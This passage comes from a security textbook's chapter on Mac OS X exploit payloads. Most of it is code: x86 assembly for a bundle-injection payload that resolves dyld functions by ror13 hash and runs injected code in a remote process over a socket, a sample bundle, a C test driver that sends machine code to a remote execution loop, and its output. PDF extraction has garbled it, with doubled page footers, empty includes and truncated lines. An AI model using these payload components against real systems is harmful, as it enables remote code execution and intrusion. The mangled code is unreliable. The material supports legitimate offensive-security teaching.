push eax ; &objectFileImage
push dword [ebp+12] ; size
push edi ; addr
ror13_hash “_NSCreateObjectFileImageFromMemory”
push hash
call _dyld_resolve
call eax
cmp al, 1
jne .return
;; link bundle from object file image
xor eax, eax
push eax
mov al, (NSLINKMODULE_OPTION_PRIVATE |
NSLINKMODULE_OPTION_RETURN_ON_ERROR |
NSLINKMODULE_OPTION_BINDNOW)
push eax
push esp ; “”
push dword [ebp-8]
ror13_hash “_NSLinkModule”
push hash
call _dyld_resolve
call eax
9955336633cc0099..iinndddd 225522 11//2255//0099 44::4422::2299 PPMM
Chapter 9 ■ Exploit Payloads 253
;; Locate load address of module. NSModule’s second pointer
;; is a pointer to a structure where the modules load address
;; is at offsets 0x24 and 0x38.
mov eax, [eax+4]
mov eax, [eax+0x24]
;; Call the bundle’s void run(void) function.
ror13_hash “_run”
push hash
push eax
call _macho_resolve
push esi
call eax
add esp, 4
.return:
leave
ret 4
The injected bundle is given control at three points. As the bundle is linked,
any defi ned constructors will be called. After linking, our bundle injector explic-
itly calls the run() function with the connected socket as an argument. This will
allow the bundle to perform any additional communication that it needs over
that established connection. The run() function returns an integer value that
will be sent back to the remote client software. Finally, any defi ned destructors
in the bundle will be called when the process exits cleanly.
The following example code shows the bundle-injection interface. The function
names init() and fi ni() are not signifi cant; any names can be used as long as they
are declared with the constructor and destructor attributes, respectively. The
run() function name, however, is signifi cant since the bundle injector looks for
it specifi cally. If a run() function is not defi ned, the bundle injector will crash.
The injected bundles can use any existing frameworks on the remote system.
This allows you to write high-level payloads that perform interesting function-
ality. For example, you can use the QTKit QuickTime framework to capture
images from the user’s iSight camera. The possibilities are endless, but we will
demonstrate some interesting ideas in Chapter 11, “Injection, Hooking, and
Swizzling.”
/*
* Simple bundle to demonstrate remote bundle injection.
*
* Compile with: cc -bundle -o bundle.bundle bundle.c
*/
#include 
extern void init(void) __attribute__ ((constructor));
void init(void)
{
9955336633cc0099..iinndddd 225533 11//2255//0099 44::4422::2299 PPMM
254 Part III ■ Exploitation
printf(“In init()\n”);
}
int run(int fd)
{
printf(“In run()\n”);
return 0xdeadbeef;
}
extern void fini(void) __attribute__ ((destructor));
void fini(void)
{
printf(“In fini()\n”);
}
Testing Complex Components
Just like any complex software development, it is important to test your pay-
loads before they are used in an exploit. A good test driver will simulate injected
execution and allow you to test and debug the payloads in a controlled, stable
environment. The following code is our test driver to test both the remote_execu-
tion_loop and inject_bundle components. It creates two threads, one for the
server and one for the client. The server thread immediately begins executing
the remote_execution_loop component. The client thread sends over a short
fragment that is simply a function that returns 0xdeadbeef as a quick test of
the remote_execution_loop. If that succeeds, the client thread sends over the
inject_bundle component and bundle.bundle. The run() function in the previous
code listing returns 0xdeadbeef and the client thread checks the return value
to make sure it sees this value. If you run this test driver and both the short-
fragment and bundle-injection tests succeed, you can be fairly certain that the
payload components will work in real-world exploits, as will be demonstrated
in the next chapter.
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
9955336633cc0099..iinndddd 225544 11//2255//0099 44::4422::2299 PPMM
Chapter 9 ■ Exploit Payloads 255
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
extern int remote_execution_loop(int socket);
void* server()
{
int s = unc(0, INADDR_ANY, 1234);
return (void*)remote_execution_loop(s);
}
int test_remote_execution_loop(int s)
{
/*
* Machine code fragment of function to return 0xdeadbeef
*/
char frag[] =
“\x55\x89\xe5\x81\xec\x20\x00\x00\x00\x53\x56\x57\xb8\xef\xbe”
“\xad\xde\x5f\x5e\x5b\xc9\xc2\x04\x00”;
int n = sizeof(frag);
fprintf(stderr, “==> test_remote_execution_loop: executing simple
component to return 0xdeadbeef\n”);
// Send machine code fragment to return 0xdeadbeef
fprintf(stderr, “ -> Sending size…\n”);
if (send(s, (char*)&n, sizeof(n), 0)  Sending code…\n”);
if (send(s, frag, sizeof(frag), 0)  Receiving return value…\n”);
if (recv(s, (char*)&n, sizeof(n), 0)  Component returned: 0x%x\n”, n);
return !(n == 0xdeadbeef);
}
int test_inject_bundle(int s)
{
int n, fd, ret;
struct stat stat_buf;
mach_vm_size_t size;
char* mem;
/*
* Send inject_bundle to remote_execution_loop
*/
/* Open file */
if ((fd = open(“inject_bundle.bin”, O_RDONLY))  test_inject_bundle: inject bundle to return
0xdeadbeef\n”);
fprintf(stderr, “ => Executing inject_bundle.bin in remote_
execution_loop…\n”);
/* Send size */
fprintf(stderr, “ -> Sending size…\n”);
if (send(s, (char*)&size, 4, 0)  Sending code…\n”);
if ((n = send(s, mem, size, 0))  Executing bundle.bundle in inject_bundle…\n”);
// Send bundle size
fprintf(stderr, “ -> Sending size…\n”);
if (send(s, (char*)&size, 4, 0)  Sending code…\n”);
if ((n = send(s, mem, size, 0))  Receiving return value…\n”);
if (recv(s, (char*)&n, sizeof(n), 0)  Bundle returned: 0x%x\n”, n);
// Check result
return (n != 0xdeadbeef);
}
int client()
{
int s = unc(1, INADDR_LOOPBACK, 1234);
if (test_remote_execution_loop(s)) {
fprintf(stderr, “test_remote_executon_loop: fail\n”);
return 1;
}
else
fprintf(stderr, “test_remote_executon_loop: ok\n”);
if (test_inject_bundle(s)) {
fprintf(stderr, “test_inject_bundle: fail\n”);
return 1;
}
else
fprintf(stderr, “test_inject_bundle: ok\n”);
return 0;
}
int main(int argc, char* argv[])
{
pthread_t thread;
pthread_create(&thread, NULL, server, NULL);
return client();
}
When you run this test program, it will print out status messages and check
the return values from injected components and bundles to make sure they
executed correctly. For example, the following is the output from test_remote_
execution_loop showing correct execution.
% ./test_remote_execution_loop
==> test_remote_execution_loop: executing simple component to return
0xdeadbeef
-> Sending size…
-> Sending code…
-> Receiving return value…
-> Component returned: 0xdeadbeef
9955336633cc0099..iinndddd 225588 11//2255//0099 44::4422::2299 PPMM
Chapter 9 ■ Exploit Payloads 259
test_remote_executon_loop: ok
==> test_inject_bundle: inject bundle to return 0xdeadbeef
=> Executing inject_bundle.bin in remote_execution_loop…
-> Sending size…
-> Sending code…
=> Executing bundle.bundle in inject_bundle…
-> Sending size…
-> Sending code…
-> Receiving return value…
In init()
In run()
-> Bundle returned: 0xdeadbeef
test_inject_bundle: ok
In fini()
Conclusion
This chapter introduced our methodology for developing and testing compo-
nent-based exploit payloads. After introducing the concepts of modern exploit
payloads, we explained some of the important intricacies of Mac OS X, such as
the requirement that vfork() come before execve() and how to save space when
calling execve(). This chapter gave a brief overview of the architectures sup-
ported by Mac OS X and demonstrated a variety of payloads on both architec-
tures: the simpler payloads on the PowerPC architecture and the more complex
on the Intel x86 architecture. The next chapter will use the demonstrated pay-
loads in full exploits against vulnerabilities in real-world Mac OS X software.
Chapter 11 will build on the inject_bundle payload to demonstrate dynamically
injecting code to override C functions and Objective-C methods.
References
“Smashing the Stack for Fun and Profi t,” Aleph One, Phrack Magazine, Issue
49, Article 14, http://www.phrack.org/issues.html?id=14&issue=49
“UNIX Assembly Codes Development for Vulnerabilities Illustration
Purposes,” Last Stage of Delirium Research Group, http://www
.blackhat.com/presentations/bh-usa-01/LSD/bh-usa-01-lsd.pdf
“Win32 Assembly Components,” Last Stage of Delirium Research
Group, http://ivanlef0u.free.fr/repo/windoz/shellcoding/winasm-
1.0.1.pdf
“Mac OS X PPC Shellcode Tricks,” Moore, H D., Uninformed Journal,
Volume 1, Article 1, http://www.uninformed.org/?v=1&a=1&t=pdf